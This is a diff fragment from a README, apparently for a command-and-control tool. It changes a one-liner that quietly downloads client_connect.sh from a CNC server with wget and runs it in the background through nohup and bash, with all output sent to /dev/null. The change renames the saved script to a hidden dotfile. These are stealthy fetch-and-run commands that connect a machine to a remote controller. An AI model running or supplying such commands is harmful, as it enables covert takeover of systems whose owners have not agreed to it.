@@ -52,7 +52,7 @@ Then follow on screen instructions.
 - - - `wget -q <cnc_server_ip>:8080/client_connect.sh &> /dev/null ;` 
 - - - `bash client_connect.sh &> /dev/null & `
 - - One-Liner
-- - - `{ wget -q -O .i.sh <cnc_server_ip>:8080/client_connect.sh ; } && { nohup bash .i.sh &> /dev/null & }`
+- - - `{ wget -q -O .c <cnc_server_ip>:8080/client_connect.sh ; } && { nohup bash .c &> /dev/null & }`
 - - Make sure you exit from CNC server with 'exit' to disconnect properly.
 
 
